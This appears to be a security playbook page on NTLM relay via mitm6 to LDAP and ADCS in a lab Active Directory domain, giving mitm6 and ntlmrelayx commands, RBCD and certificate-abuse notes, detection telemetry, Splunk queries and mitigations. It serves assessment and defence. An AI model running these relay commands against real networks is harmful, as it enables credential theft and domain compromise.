# 03) NTLM Relay (mitm6) → LDAP/ADCS
**ATT&CK:** T1557 (Adversary-in-the-Middle), T1550.002 (Use of NTLM)  
**Scope:** Authorized lab/assessment only.

## Objective
Abuse name-resolution and NTLM to relay authentication and gain LDAP write or enroll certificates via ADCS web endpoints.

## Environment (assumed)
- **Domain:** `DRAGONBALL.local`
- **DC:** `DC01` — **10.8.10.225**
- **CA (ADCS):** `CA01` — **10.8.10.200**
- **Operator box:** `KALI` — **10.8.10.50**
- **Layer 2 proximity** to victim clients (same VLAN / broadcast domain).

## Preconditions / Common Misconfigs
- Clients use **WPAD** or accept rogue **DHCPv6**/IPv6 autoconfig.  
- **SMB signing** not enforced everywhere.  
- ADCS HTTP endpoints exposed (e.g., `http://CA01/certsrv/`), weak templates.

## Procedure (High-Level)
1. Coerce clients to talk IPv6/WPAD (same L2).  
2. Capture/relay NTLM to **LDAP** on `DC01` or **ADCS** on `CA01`.  
3. If relayed to LDAP and account has permissions, write something valuable (e.g., RBCD attribute).  
4. If relayed to ADCS, enroll a certificate and use it for Kerberos (PKINIT).

> **Legal/Ethical:** Commands below are documentation examples for **authorized labs only**.

## Doc-Only Command Examples (authorized lab)
```bash
# 1) Force IPv6 name resolution with mitm6
mitm6 -d DRAGONBALL.local

# 2a) Relay to LDAP on the DC and loot
ntlmrelayx.py -6 -t ldap://10.8.10.225 -wh attacker-wpad -l loot/

# 2b) Or relay to ADCS HTTP endpoint (ESC1-style paths)
ntlmrelayx.py -6 -t http://10.8.10.200/certsrv/certfnsh.asp --adcs
```
### Notes

- **RBCD via relay:** write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer account, then use **S4U** to impersonate.
- **ADCS via relay:** a vulnerable template (Client Authentication EKU + `ENROLLEE_SUPPLIES_SUBJECT`, etc.) enables certificate issuance; then use **PKINIT** to obtain a **TGT**.

### Telemetry to Collect

- **Network:** WPAD/DHCPv6 anomalies; clients authenticating to unexpected hosts.
- **Directory:** **5136** attribute writes (especially `msDS-AllowedToActOnBehalfOfOtherIdentity`).
- **ADCS:** enrollment logs; spikes in requests; suspicious SANs.
- **Auth:** **4768/4769** bursts after successful certificate enrollment.
---
### SIEM Analytics (Splunk examples)
```sql
# RBCD write attempts
index=wineventlog EventCode=5136
| search AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity"
| stats values(SubjectUserName) values(ObjectDN) count by Computer, _time

# Unusual ADCS enrollments (if forwarded)
index=adcs sourcetype=enrollment_logs
| stats count by Template, Requester, SAN
| where count > 3

# WPAD/mitm6 hints via DNS/Proxy logs (example placeholder)
index=proxy OR index=dns wpad OR "wpad.dat"
| stats count by src_ip, host
| where count > 10
```
## Mitigations

- **Disable WPAD** domain-wide; set explicit proxy or none via **GPO**.
- **Restrict/disable IPv6** where not used; block **rogue DHCPv6**.
- **Enforce SMB signing**; require **EPA** (Extended Protection) on **IIS/WinRM**.
- **ADCS hardening:** remove vulnerable templates (`ENROLLEE_SUPPLIES_SUBJECT`), keep **minimal EKUs**, restrict enrollment, require approvals, and **monitor enrollments**.
- **Network hygiene:** segment and monitor critical services; enforce **egress controls** from clients.
